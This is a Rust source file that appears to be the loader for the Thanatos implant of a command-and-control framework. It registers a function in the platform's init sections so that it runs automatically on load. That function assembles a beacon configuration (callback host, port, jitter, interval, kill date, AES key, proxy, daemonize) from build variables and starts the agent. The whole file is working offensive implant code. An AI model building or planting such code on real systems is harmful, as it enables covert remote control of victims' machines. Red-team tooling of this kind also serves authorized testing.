use thanatos::config::Config;

#[used]
#[cfg_attr(unix, link_section = ".init_array")]
#[cfg_attr(windows, link_section = ".CRT$XCU")]
static INIT: fn() = run;

fn run() {
    let config = Config {
        uuid: env!("UUID").to_owned(),
        connection_retries: env!("connection_retries").parse().unwrap(),
        tlsuntrusted: cfg!(feature = "tlsuntrusted"),
        working_start: env!("working_start").parse().unwrap(),
        working_end: env!("working_end").parse().unwrap(),
        systemproxy: cfg!(feature = "systemproxy"),
        callback_port: env!("callback_port").parse().unwrap(),
        killdate: env!("killdate").parse().unwrap(),
        eke: cfg!(feature = "eke"),
        callback_jitter: env!("callback_jitter").parse().unwrap(),
        headers: option_env!("headers").map(|headers| headers.to_string()),
        aes_key: option_env!("AESKEY").map(|aes_key| aes_key.to_string()),
        callback_host: env!("callback_host").to_owned(),
        get_uri: env!("get_uri").to_owned(),
        post_uri: env!("post_uri").to_owned(),
        query_path_name: env!("query_path_name").to_owned(),
        proxy_info: option_env!("proxy_info").map(|proxy_info| proxy_info.to_string()),
        callback_interval: env!("callback_interval").parse().unwrap(),
        #[cfg(unix)]
        daemonize: cfg!(feature = "daemonize"),
    };

    thanatos::entrypoint(config);
}
